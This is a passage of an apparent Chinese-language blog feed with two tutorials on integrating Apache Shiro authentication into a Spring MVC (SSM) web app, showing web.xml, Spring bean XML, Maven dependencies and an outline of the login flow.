class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">  Licensed to the Apache Software Foundation (ASF) under one or more</span><br><span class="line">  contributor license agreements.  See the NOTICE file distributed with</span><br><span class="line">  this work for additional information regarding copyright ownership.</span><br><span class="line">  The ASF licenses this file to You under the Apache License, Version 2.0</span><br><span class="line">  (the &quot;License&quot;); you may not use this file except in compliance with</span><br><span class="line">  the License.  You may obtain a copy of the License at</span><br><span class="line"></span><br><span class="line">      http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="line"></span><br><span class="line">  Unless required by applicable law or agreed to in writing, software</span><br><span class="line">  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="line">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="line">  See the License for the specific language governing permissions and</span><br><span class="line">  limitations under the License.</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">  - This is the Cocoon web-app configurations file</span><br><span class="line">  -</span><br><span class="line">  - $Id$</span><br><span class="line">  --&gt;</span><br><span class="line">&lt;web-app version=&quot;2.4&quot;</span><br><span class="line">         xmlns=&quot;http://java.sun.com/xml/ns/j2ee&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd&quot;&gt;</span><br><span class="line">  &lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">      &lt;param-name&gt;encoding&lt;/param-name&gt;</span><br><span class="line">      &lt;param-value&gt;UTF-8&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">  &lt;/filter&gt;</span><br><span class="line">  &lt;filter-mapping&gt;</span><br><span class="line">    &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/filter-mapping&gt;</span><br><span class="line"></span><br><span class="line">  &lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;shiroFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;/filter-class&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">      &lt;param-name&gt;targetFilterLifecycle&lt;/param-name&gt;</span><br><span class="line">      &lt;param-value&gt;true&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">  &lt;/filter&gt;</span><br><span class="line">  &lt;filter-mapping&gt;</span><br><span class="line">    &lt;filter-name&gt;shiroFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/filter-mapping&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;SpringMVC&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">      &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span><br><span class="line">      &lt;param-value&gt;classpath:spring/spring-*.xml&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;SpringMVC&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure></div><h3 id="1-4-创建spring-mvc-xml"><a href="#1-4-创建spring-mvc-xml" class="headerlink" title="1.4 创建spring-mvc.xml"></a>1.4 创建spring-mvc.xml</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;</span><br><span class="line">       xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans</span><br><span class="line">       http://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class="line">       http://www.springframework.org/schema/context</span><br><span class="line">       http://www.springframework.org/schema/context/spring-context.xsd</span><br><span class="line">       http://www.springframework.org/schema/mvc</span><br><span class="line">       http://www.springframework.org/schema/mvc/spring-mvc-3.2.xsd&quot;&gt;</span><br><span class="line">    &lt;context:component-scan base-package=&quot;com.imgurl.controller&quot; /&gt;</span><br><span class="line">    &lt;mvc:annotation-driven /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;bean id=&quot;shiroFilter&quot; class=&quot;org.apache.shiro.spring.web.ShiroFilterFactoryBean&quot;&gt;</span><br><span class="line">        &lt;property name=&quot;securityManager&quot; ref=&quot;securityManager&quot; /&gt;</span><br><span class="line">        &lt;property name=&quot;loginUrl&quot; value=&quot;/login.jsp&quot; /&gt;</span><br><span class="line">        &lt;property name=&quot;filterChainDefinitions&quot;&gt;</span><br><span class="line">            &lt;value&gt;</span><br><span class="line">                /login=anon</span><br><span class="line">                /admin/**=authc</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">    &lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;</span><br><span class="line">        &lt;property name=&quot;viewClass&quot; value=&quot;org.springframework.web.servlet.view.JstlView&quot;/&gt;</span><br><span class="line">        &lt;property name=&quot;prefix&quot; value=&quot;WEB-INF/views&quot; /&gt;</span><br><span class="line">        &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot; /&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure></div><h3 id="1-5创建spring-shiro-xml"><a href="#1-5创建spring-shiro-xml" class="headerlink" title="1.5创建spring-shiro.xml"></a>1.5创建spring-shiro.xml</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:util=&quot;http://www.springframework.org/schema/util&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;</span><br><span class="line">       http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class="line">       http://www.springframework.org/schema/util http://www.springframework.org/schema/util/spring-util.xsd&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Shiro的Web过滤器 --&gt;</span><br><span class="line">    &lt;bean id=&quot;shiroFilter&quot; class=&quot;org.apache.shiro.spring.web.ShiroFilterFactoryBean&quot;&gt;</span><br><span class="line">        &lt;!-- Shiro的安全管理器，所有关于安全的操作都会经过SecurityManager --&gt;</span><br><span class="line">        &lt;property name=&quot;securityManager&quot; ref=&quot;securityManager&quot;/&gt;</span><br><span class="line">        &lt;!-- 系统认证提交地址，如果用户退出即session丢失就会访问这个页面 --&gt;</span><br><span class="line">        &lt;property name=&quot;loginUrl&quot; value=&quot;/login.jsp&quot;/&gt;</span><br><span class="line">        &lt;!-- 权限验证失败跳转的页面，需要配合Spring的ExceptionHandler异常处理机制使用 --&gt;</span><br><span class="line">        &lt;property name=&quot;unauthorizedUrl&quot; value=&quot;/unauthorized.jsp&quot;/&gt;</span><br><span class="line">        &lt;property name=&quot;filters&quot;&gt;</span><br><span class="line">            &lt;util:map&gt;</span><br><span class="line">                &lt;entry key=&quot;authc&quot; value-ref=&quot;formAuthenticationFilter&quot;/&gt;</span><br><span class="line">            &lt;/util:map&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">        &lt;!-- 自定义的过滤器链，从上向下执行，一般将`/**`放到最下面 --&gt;</span><br><span class="line">        &lt;property name=&quot;filterChainDefinitions&quot;&gt;</span><br><span class="line">            &lt;value&gt;</span><br><span class="line">                &lt;!-- 静态资源不拦截 --&gt;</span><br><span class="line">                /static/** = anon</span><br><span class="line">                /lib/** = anon</span><br><span class="line">                /js/** = anon</span><br><span class="line"></span><br><span class="line">                &lt;!-- 登录页面不拦截 --&gt;</span><br><span class="line">                /login.jsp = anon</span><br><span class="line">                /login.do = anon</span><br><span class="line"></span><br><span class="line">                &lt;!-- Shiro提供了退出登录的配置`logout`，会生成路径为`/logout`的请求地址，访问这个地址即会退出当前账户并清空缓存 --&gt;</span><br><span class="line">                /logout = logout</span><br><span class="line"></span><br><span class="line">                &lt;!-- user表示身份通过或通过记住我通过的用户都能访问系统 --&gt;</span><br><span class="line">                /index.jsp = user</span><br><span class="line"></span><br><span class="line">                &lt;!-- `/**`表示所有请求，表示访问该地址的用户是身份验证通过或RememberMe登录的都可以 --&gt;</span><br><span class="line">                /** = user</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 基于Form表单的身份验证过滤器 --&gt;</span><br><span class="line">    &lt;bean id=&quot;formAuthenticationFilter&quot; class=&quot;org.apache.shiro.web.filter.authc.FormAuthenticationFilter&quot;&gt;</span><br><span class="line">        &lt;property name=&quot;usernameParam&quot; value=&quot;username&quot;/&gt;</span><br><span class="line">        &lt;property name=&quot;passwordParam&quot; value=&quot;password&quot;/&gt;</span><br><span class="line">        &lt;property name=&quot;loginUrl&quot; value=&quot;/login.jsp&quot;/&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 安全管理器 --&gt;</span><br><span class="line">    &lt;bean id=&quot;securityManager&quot; class=&quot;org.apache.shiro.web.mgt.DefaultWebSecurityManager&quot;&gt;</span><br><span class="line">        &lt;property name=&quot;realm&quot; ref=&quot;userRealm&quot; /&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Realm实现 --&gt;</span><br><span class="line">    &lt;bean id=&quot;userRealm&quot; class=&quot;com.imgurl.realm.UserRealm&quot;&gt;&lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure></div><h3 id="1-6创建UserRealm实例"><a href="#1-6创建UserRealm实例" class="headerlink" title="1.6创建UserRealm实例"></a>1.6创建UserRealm实例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSM框架整合のShiro</title>
      <link href="/2019/04/29/ssm-kuang-jia-zheng-he-noshiro/"/>
      <url>/2019/04/29/ssm-kuang-jia-zheng-he-noshiro/</url>
      
        <content type="html"><![CDATA[<h1 id="SSM框架整合のShiro"><a href="#SSM框架整合のShiro" class="headerlink" title="SSM框架整合のShiro"></a>SSM框架整合のShiro</h1><blockquote><p> 前面我们学习了如何使用IDEA+Maven创建SSM框架，配置拦截器等。当你的项目越来越大，对不同的用户就有不同的权限，这样我们就不只是局限于系统去判定他是否登录了。</p></blockquote><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><blockquote><p> 已经利用Maven创建好SSM框架<a href="https://kalifun.top/archives/184" target="_blank" rel="noopener">IDEA 简单创建SSM框架</a>。数据相关内容请查看<a href="https://kalifun.top/archives/200" target="_blank" rel="noopener">Shiroの表结构设计</a></p></blockquote><h2 id="1-导入jar包"><a href="#1-导入jar包" class="headerlink" title="1.导入jar包"></a>1.导入jar包</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;shiro-spring&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;1.4.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- https://mvnrepository.com/artifact/org.apache.shiro/shiro-ehcache --&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;shiro-ehcache&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;1.4.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- https://mvnrepository.com/artifact/org.apache.shiro/shiro-quartz --&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;shiro-quartz&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;1.4.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;!-- https://mvnrepository.com/artifact/org.apache.shiro/shiro-web --&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;shiro-web&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;1.4.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- https://mvnrepository.com/artifact/org.apache.shiro/shiro-core --&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;shiro-core&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;1.4.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div><p>将上面的贴到pom.xml中。当你使用其他版本时需要注意关联。尽可能版本相同。</p><h2 id="2-整合Shiro"><a href="#2-整合Shiro" class="headerlink" title="2.整合Shiro"></a>2.整合Shiro</h2><h3 id="2-1-配置过滤器"><a href="#2-1-配置过滤器" class="headerlink" title="2.1 配置过滤器"></a>2.1 配置过滤器</h3><blockquote><h4 id="修改web-xml文件"><a href="#修改web-xml文件" class="headerlink" title="修改web.xml文件"></a>修改web.xml文件</h4></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;shiroFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;/filter-class&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">      &lt;param-name&gt;targetFilterLifecycle&lt;/param-name&gt;</span><br><span class="line">      &lt;param-value&gt;true&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">  &lt;/filter&gt;</span><br><span class="line">  &lt;filter-mapping&gt;</span><br><span class="line">    &lt;filter-name&gt;shiroFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/filter-mapping&gt;</span><br></pre></td></tr></table></figure></div><p> 你会发现和我们配置SpringMVC的EncodingFilter很像。DelegatingFilterProxy会自动到Spring容器中name为shiroFilter的bean，并且将所有Filter的操作都委托给他管理。</p><h3 id="2-2配置Bean"><a href="#2-2配置Bean" class="headerlink" title="2.2配置Bean"></a>2.2配置Bean</h3><blockquote><p> 创建spring-shiro.xml文件</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=&quot;shiroFilter&quot; class=&quot;org.apache.shiro.spring.web.ShiroFilterFactoryBean&quot;&gt;&lt;/bean&gt;</span><br></pre></td></tr></table></figure></div><p> 需要注意这里的id需要和我们在web.xml中创建的过滤器名称相同否则无效。看过我<a href="https://kalifun.top/archives/184" target="_blank" rel="noopener">IDEA 简单创建SSM框架</a>这个文章的就知道，因为在web.xml设置名称为spring-*.xml。会自己去扫描文件前缀后缀匹配的。</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:util=&quot;http://www.springframework.org/schema/util&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;</span><br><span class="line">       http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class="line">       http://www.springframework.org/schema/util http://www.springframework.org/schema/util/spring-util.xsd&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Shiro的Web过滤器 --&gt;</span><br><span class="line">    &lt;bean id=&quot;shiroFilter&quot; class=&quot;org.apache.shiro.spring.web.ShiroFilterFactoryBean&quot;&gt;</span><br><span class="line">        &lt;!-- Shiro的安全管理器，所有关于安全的操作都会经过SecurityManager --&gt;</span><br><span class="line">        &lt;property name=&quot;securityManager&quot; ref=&quot;securityManager&quot;/&gt;</span><br><span class="line">        &lt;!-- 系统认证提交地址，如果用户退出即session丢失就会访问这个页面 --&gt;</span><br><span class="line">        &lt;property name=&quot;loginUrl&quot; value=&quot;/login.jsp&quot;/&gt;</span><br><span class="line">        &lt;!-- 权限验证失败跳转的页面，需要配合Spring的ExceptionHandler异常处理机制使用 --&gt;</span><br><span class="line">        &lt;property name=&quot;unauthorizedUrl&quot; value=&quot;/unauthorized.jsp&quot;/&gt;</span><br><span class="line">        &lt;property name=&quot;filters&quot;&gt;</span><br><span class="line">            &lt;util:map&gt;</span><br><span class="line">                &lt;entry key=&quot;authc&quot; value-ref=&quot;formAuthenticationFilter&quot;/&gt;</span><br><span class="line">            &lt;/util:map&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">        &lt;!-- 自定义的过滤器链，从上向下执行，一般将`/**`放到最下面 --&gt;</span><br><span class="line">        &lt;property name=&quot;filterChainDefinitions&quot;&gt;</span><br><span class="line">            &lt;value&gt;</span><br><span class="line">                &lt;!-- 静态资源不拦截 --&gt;</span><br><span class="line">                /static/** = anon</span><br><span class="line">                /lib/** = anon</span><br><span class="line">                /js/** = anon</span><br><span class="line"></span><br><span class="line">                &lt;!-- 登录页面不拦截 --&gt;</span><br><span class="line">                /login.jsp = anon</span><br><span class="line">                /login.do = anon</span><br><span class="line"></span><br><span class="line">                &lt;!-- Shiro提供了退出登录的配置`logout`，会生成路径为`/logout`的请求地址，访问这个地址即会退出当前账户并清空缓存 --&gt;</span><br><span class="line">                /logout = logout</span><br><span class="line"></span><br><span class="line">                &lt;!-- user表示身份通过或通过记住我通过的用户都能访问系统 --&gt;</span><br><span class="line">                /index.jsp = user</span><br><span class="line"></span><br><span class="line">                &lt;!-- `/**`表示所有请求，表示访问该地址的用户是身份验证通过或RememberMe登录的都可以 --&gt;</span><br><span class="line">                /** = user</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 基于Form表单的身份验证过滤器 --&gt;</span><br><span class="line">    &lt;bean id=&quot;formAuthenticationFilter&quot; class=&quot;org.apache.shiro.web.filter.authc.FormAuthenticationFilter&quot;&gt;</span><br><span class="line">        &lt;property name=&quot;usernameParam&quot; value=&quot;username&quot;/&gt;</span><br><span class="line">        &lt;property name=&quot;passwordParam&quot; value=&quot;password&quot;/&gt;</span><br><span class="line">        &lt;property name=&quot;loginUrl&quot; value=&quot;/login.jsp&quot;/&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 安全管理器 --&gt;</span><br><span class="line">    &lt;bean id=&quot;securityManager&quot; class=&quot;org.apache.shiro.web.mgt.DefaultWebSecurityManager&quot;&gt;</span><br><span class="line">        &lt;property name=&quot;realm&quot; ref=&quot;userRealm&quot;/&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Realm实现 --&gt;</span><br><span class="line">    &lt;bean id=&quot;userRealm&quot; class=&quot;xx.xxxxx.xxxxx.UserRealm&quot;&gt;&lt;/bean&gt;</span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure></div><blockquote><p> Realm：域，Shiro 从从Realm获取安全数据（如用户、角色、权限），就是说SecurityManager要验证用户身份，那么它需要从Realm获取相应的用户进行比较以确定用户身份是否合法；也需要从Realm得到用户相应的角色/权限进行验证用户是否能进行操作；可以把Realm看成DataSource ， 即安全数据源。<br> 上面配置类似于我们使用的mvc:interceptors一样。对需要过滤的进行设置，对不过滤的放入安全管理器进行管理。我们利用创建UserRealm实例来实现自定义的数据管理。</p></blockquote><h2 id="3-Shiro实现身份认证"><a href="#3-Shiro实现身份认证" class="headerlink" title="3.Shiro实现身份认证"></a>3.Shiro实现身份认证</h2><h3 id="3-1身份认证流程"><a href="#3-1身份认证流程" class="headerlink" title="3.1身份认证流程"></a>3.1身份认证流程</h3><blockquote><p> 一般后台登录我们需要提交的表单是username,password。不排除于利用邮箱登录的。根据后台登录页面提交的字段来针对form表单的身份验证过滤器进行修改（formAuthenticationFilter）。</p><ul><li>用户输入这两个用户名和密码后提交表单，通过绑定了SecurityManager的SecurityUtils得到Subject实例，然后获取身份验证的UsernamePasswordToken传入用户名和密码。</li><li>调用subject.login(token)进行登录，SecurityManager会委托Authenticator把相应的token传给Realm，从Realm中获取身份认证信息。</li><li>Realm可以是自己实现的Realm，Realm会根据传入的用户名和密码去数据库进行校验（提供Service层登录接口）。</li><li>Shiro从Realm中获取安全数据（如用户、身份、权限等），如果校验失败，就会抛出异常，登录失败；否则就登录成功。</li></ul></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span 